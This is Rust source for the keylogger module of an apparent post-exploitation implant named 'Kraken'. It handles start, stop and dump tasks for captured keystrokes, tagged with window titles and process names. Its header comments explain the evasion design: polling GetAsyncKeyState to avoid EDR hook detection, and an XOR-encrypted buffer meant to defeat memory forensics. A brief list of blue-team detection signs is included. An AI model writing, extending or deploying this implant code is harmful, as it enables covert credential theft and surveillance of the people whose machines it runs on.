//! mod-keylog: Keystroke logging module for Kraken implant
//!
//! Provides start, stop, and dump operations for keystroke capture.
//! Uses GetAsyncKeyState polling for OPSEC-friendly capture that avoids
//! SetWindowsHookEx (commonly monitored by EDRs).
//!
//! ## Features
//! - GetAsyncKeyState polling (10ms default interval)
//! - Window title and process name tracking
//! - Encrypted in-memory buffer (XOR with session key)
//! - Auto-flush on size threshold or time interval
//! - Support for special keys ([ENTER], [TAB], etc.)
//!
//! ## OPSEC Considerations
//! - No hook installation (avoids SetWindowsHookEx detection)
//! - Adaptive polling possible (reduce CPU when idle)
//! - Encrypted buffer defeats memory forensics
//! - Window tracking provides context for captured credentials
//!
//! ## Detection Vectors (Blue Team)
//! - Rapid GetAsyncKeyState calls (>100/sec sustained)
//! - Process without visible window calling input APIs
//! - GetForegroundWindow polling from background process

use common::{KrakenError, KeylogEntry, KeylogOutput, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{keylog_task, KeylogStart, KeylogTask};
use std::time::{SystemTime, UNIX_EPOCH};

mod buffer;
mod capture;
mod translate;
mod window;

pub use buffer::{BufferConfig, KeystrokeBuffer, KeystrokeEntry};
pub use capture::{
    cleanup, dump_keystrokes, get_stats, is_active, start_capture, start_capture_with_config,
    stop_capture, CaptureConfig, CaptureStats, CapturedKeystrokes,
};
pub use translate::{is_caps_lock_on, is_key_pressed, is_shift_pressed, translate_vk, KeyTranslation};
pub use window::{WindowInfo, WindowTracker};

pub struct KeylogModule {
    id: ModuleId,
}

impl KeylogModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("keylog"),
        }
    }
}

impl Default for KeylogModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for KeylogModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Keylog"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: KeylogTask =
            KeylogTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(keylog_task::Operation::Start(start)) => self.handle_start(start),
            Some(keylog_task::Operation::Stop(_)) => self.handle_stop(),
            Some(keylog_task::Operation::Dump(_)) => self.handle_dump(),
            None => Err(KrakenError::Protocol("missing keylog operation".into())),
        }
    }
}

impl KeylogModule {
    fn handle_start(&self, start: KeylogStart) -> Result<TaskResult, KrakenError> {
        // Build config from proto
        let config = CaptureConfig {
            poll_interval_ms: 10, // Fixed for OPSEC
            max_buffer_entries: start.buffer_size.unwrap_or(100) as usize,
            flush_interval_secs: (start.flush_interval_ms.unwrap_or(60000) / 1000) as u64,
            track_windows: start.track_window.unwrap_or(true),
        };

        start_capture_with_config(config)?;

        Ok(TaskResult::Success)
    }

    fn handle_stop(&self) -> Result<TaskResult, KrakenError> {
        stop_capture()?;
        Ok(TaskResult::Success)
    }

    fn handle_dump(&self) -> Result<TaskResult, KrakenError> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0);

        match dump_keystrokes() {
            Ok(entries) => {
                let total_keystrokes: usize =
                    entries.iter().map(|e| e.keystrokes.len()).sum();

                let start_time = get_stats().map(|s| s.start_time).unwrap_or(0);

                let keylog_entries: Vec<KeylogEntry> = entries
                    .into_iter()
                    .map(|e| KeylogEntry {
                        window_title: e.window_title,
                        process_name: e.process_name,
                        keystrokes: e.keystrokes,
                        timestamp: e.timestamp,
                    })
                    .collect();

                let result = KeylogOutput {
                    entries: keylog_entries,
                    start_time,
                    end_time: now,
                    total_keystrokes: total_keystrokes as u32,
                    note: String::new(),
                };

                Ok(TaskResult::Keylog(result))
            }
            Err(e) => {
                // Return empty result with error note
                let result = KeylogOutput {
                    entries: vec![],
                    start_time: 0,
                    end_time: now,
                    total_keystrokes: 0,
                    note: format!("dump failed: {}", e),
                };
                Ok(TaskResult::Keylog(result))
            }
        }
    }
}

impl Drop for KeylogModule {
    fn drop(&mut self) {
        // Clean up capture state when module is unloaded
        cleanup();
    }
}

#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(KeylogModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = KeylogModule::new();
        assert_eq!(module.id().as_str(), "keylog");
        assert_eq!(module.name(), "Keylog");
    }

    #[test]
    fn test_module_version() {
        let module = KeylogModule::new();
        assert!(!module.version().is_empty());
    }

    #[test]
    fn test_default_impl() {
        let module = KeylogModule::default();
        assert_eq!(module.id().as_str(), "keylog");
    }
}
